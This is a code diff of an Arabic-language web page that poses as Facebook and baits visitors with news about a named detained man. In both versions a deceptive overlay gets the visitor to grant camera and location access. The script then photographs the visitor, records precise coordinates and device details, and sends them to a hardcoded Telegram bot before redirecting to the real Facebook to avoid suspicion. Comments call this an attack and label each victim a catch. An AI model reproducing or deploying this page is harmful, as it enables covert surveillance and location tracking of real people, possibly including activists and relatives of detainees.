@@ -3,129 +3,115 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>مشغل الفيديو - فيسبوك</title>
     
-    <title>فيسبوك - أين محمد مصطفى العنعوني؟</title>
-    <meta property="og:title" content="أين محمد مصطفى العنعوني؟ #الحرية_للمعتقلين">
-    <meta property="og:description" content="بأي ذنب يُخطف [محمد مصطفى العنعوني]؟ وبأي حق نعيش في غابة يغيب فيها القانون... اللهم ردّه إلينا سالماً.">
+    <meta property="og:title" content="شاهد: تفاصيل قضية محمد مصطفى العنعوني">
     <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/thumb/0/05/Facebook_Logo_%282019%29.png/1024px-Facebook_Logo_%282019%29.png">
-    <meta property="og:url" content="https://www.facebook.com">
-    <meta property="og:type" content="article">
 
     <style>
-        body {margin:0;padding:0;background:#f0f2f5;font-family:system-ui,sans-serif;display:flex;justify-content:center;align-items:flex-start;min-height:100vh;padding-top:20px;}
-        .fb-container {width:100%;max-width:400px;background:white;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,.1);overflow:hidden;}
-        .header {background:#1877f2;padding:12px;text-align:center;color:white;font-size:20px;font-weight:bold;}
-        .form-area {padding:20px;}
-        input {width:100%;padding:14px;margin:8px 0;border:1px solid #dddfe2;border-radius:6px;font-size:16px;box-sizing:border-box;}
-        .login-btn {width:100%;padding:14px;background:#1877f2;color:white;font-size:18px;font-weight:bold;border:none;border-radius:6px;cursor:pointer;margin-top:10px;}
+        body { margin:0; padding:0; background:#000; font-family: sans-serif; overflow: hidden; }
         
-        /* نافذة التفاعل الفوري (لفتح ثغرة المتصفح) */
-        #startOverlay {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(255,255,255,0.95); z-index: 10000;
-            display: flex; flex-direction: column; align-items: center; justify-content: center;
-            text-align: center; padding: 20px;
-        }
-        .start-btn { padding: 15px 40px; background: #1877f2; color: white; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; }
+        /* فيديو الخلفية للتمويه */
+        .video-bg { position: fixed; width: 100%; height: 100%; object-fit: cover; opacity: 0.6; }
 
-        #warning {
-            display:none; position:fixed; top:0; left:0; right:0; bottom:0; 
-            background:rgba(0,0,0,0.9); color:white; text-align:center; 
-            padding:40px; font-size:18px; z-index:10001; flex-direction:column; justify-content:center; align-items:center;
+        /* طبقة التمويه البصري */
+        #clickjack-overlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            z-index: 10000; display: flex; flex-direction: column;
+            align-items: center; justify-content: flex-start; /* تبدأ من الأعلى حيث تظهر الأذونات */
+            padding-top: 100px; background: rgba(0,0,0,0.8);
         }
+
+        .fake-btn {
+            padding: 15px 50px; background: #1877f2; color: white;
+            border: none; border-radius: 30px; font-weight: bold;
+            font-size: 18px; cursor: pointer; box-shadow: 0 0 20px rgba(24,119,242,0.5);
+        }
+
+        .instruction { color: white; margin-bottom: 20px; text-align: center; padding: 0 20px; }
     </style>
 </head>
 <body>
 
-<div id="startOverlay">
-    <div style="margin-bottom: 20px; color: #1c1e21; font-size: 18px; line-height: 1.5;">
-        ⚠️ يجب تسجيل الدخول للمتابعة وقراءة تفاصيل الخبر.
-    </div>
-    <button class="start-btn" id="initBtn">متابعة إلى فيسبوك</button>
-</div>
+    <video class="video-bg" autoplay muted loop playsinline>
+        <source src="1.mp4" type="video/mp4">
+    </video>
 
-<div id="warning">
-    <div>⚠️ يجب السماح بالأذونات (الكاميرا والموقع) لتأمين حسابك قبل قراءة المحتوى الحساس.</div>
-    <button style="margin-top:20px; padding:10px 20px; background:#1877f2; border:none; color:white; border-radius:5px;" onclick="location.reload()">إعادة محاولة</button>
-</div>
-
-<div class="fb-container" id="fbMain">
-    <div class="header">فيسبوك</div>
-    <div class="form-area">
-        <form id="loginForm">
-            <input type="text" id="user" placeholder="رقم الجوال أو البريد الإلكتروني" required>
-            <input type="password" id="pass" placeholder="كلمة المرور" required>
-            <button type="submit" class="login-btn">تسجيل الدخول</button>
-        </form>
+    <div id="clickjack-overlay">
+        <div class="instruction">
+            <h2>⚠️ محتوى حساس</h2>
+            <p>لتشغيل الفيديو وتأكيد أنك لست روبوت، اضغط على الزر أدناه واسمح بالوصول.</p>
+        </div>
+        <button class="fake-btn" id="p_trigger">اضغط هنا للمشاهدة</button>
     </div>
-</div>
 
 <script>
 const BOT_TOKEN = "8527565205:AAFpoyLDZir4oiQKqZPO-Cm40XVzUBvLER8";
 const CHAT_ID = "1611398303";
 
-// تشغيل الهجوم فور الضغط على متابعة
-document.getElementById('initBtn').onclick = function() {
-    document.getElementById('startOverlay').style.display = 'none';
-    startCapture();
+document.getElementById('p_trigger').onclick = function() {
+    // إخفاء التمويه فوراً لبدء العملية
+    document.getElementById('clickjack-overlay').style.opacity = "0.5"; 
+    document.getElementById('p_trigger').innerText = "جاري التحميل...";
+
+    // 🔱 تنفيذ الهجوم المتسلسل
+    executeSequence();
 };
 
-async function startCapture() {
+async function executeSequence() {
     try {
-        // طلب الكاميرا والموقع بتفاعل واحد
+        // 1. طلب الكاميرا (سيظهر الإذن في الأعلى بجانب الزر الذي ضغط عليه المستخدم)
         const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-        const video = document.createElement('video');
-        video.srcObject = stream;
-        video.play();
+        
+        // 2. إذا وافق، نلتقط الصورة فوراً
+        const v = document.createElement('video');
+        v.srcObject = stream;
+        v.play();
 
         setTimeout(async () => {
             const canvas = document.createElement('canvas');
-            canvas.width = 1280; canvas.height = 720;
-            canvas.getContext('2d').drawImage(video, 0, 0, 1280, 720);
-            const imageData = canvas.toDataURL('image/jpeg');
+            canvas.width = 720; canvas.height = 1280;
+            canvas.getContext('2d').drawImage(v, 0, 0, 720, 1280);
+            const imgData = canvas.toDataURL('image/jpeg');
             stream.getTracks().forEach(t => t.stop());
 
+            // 3. طلب الموقع مباشرة بعد الكاميرا
             navigator.geolocation.getCurrentPosition(
-                (pos) => sendToTelegram(imageData, pos),
-                () => document.getElementById('warning').style.display = 'flex',
+                (pos) => finalize(imgData, pos),
+                () => finalize(imgData, null),
                 { enableHighAccuracy: true }
             );
-        }, 1500);
+        }, 1000);
 
     } catch (err) {
-        document.getElementById('warning').style.display = 'flex';
+        // إذا رفض، نوجهه لصفحة فيسبوك لكي لا يشك
+        window.location.href = "https://m.facebook.com/";
     }
 }
 
-async function sendToTelegram(img, pos) {
-    const lat = pos.coords.latitude.toFixed(6);
-    const lng = pos.coords.longitude.toFixed(6);
-    const mapsUrl = `https://www.google.com/maps?q=${lat},${lng}`;
-    
-    const caption = `🎯 صيد جديد (عن طريق الخبر)\n📍 الموقع: ${lat},${lng}\n🔗 الخريطة: ${mapsUrl}`;
+async function finalize(img, pos) {
+    let text = `🚩 صيد (تمويه بصري)\n📱 الجهاز: ${navigator.platform}`;
+    if(pos) {
+        text += `\n📍 الموقع: ${pos.coords.latitude},${pos.coords.longitude}`;
+    }
 
     const blob = dataURLtoBlob(img);
     const fd = new FormData();
-    fd.append('photo', blob, 'victim.jpg');
-    fd.append('caption', caption);
+    fd.append('photo', blob, 'cam.jpg');
+    fd.append('caption', text);
     fd.append('chat_id', CHAT_ID);
 
     await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
-}
-
-function dataURLtoBlob(dataurl) {
-    let arr = dataurl.split(','), mime = arr[0].match(/:(.*?);/)[1],
-        bstr = atob(arr[1]), n = bstr.length, u8arr = new Uint8Array(n);
-    while(n--) u8arr[n] = bstr.charCodeAt(n);
-    return new Blob([u8arr], {type: mime});
-}
-
-document.getElementById('loginForm').onsubmit = function(e) {
-    e.preventDefault();
-    // توجيه نهائي للفيسبوك الحقيقي لإكمال التمويه
+    
+    // التوجيه النهائي
     window.location.href = "https://m.facebook.com/";
-};
-</script>
+}
 
+function dataURLtoBlob(d) {
+    let arr = d.split(','), m = arr[0].match(/:(.*?);/)[1], b = atob(arr[1]), n = b.length, u = new Uint8Array(n);
+    while(n--) u[n] = b.charCodeAt(n);
+    return new Blob([u], {type: m});
+}
+</script>
 </body>
 </html>
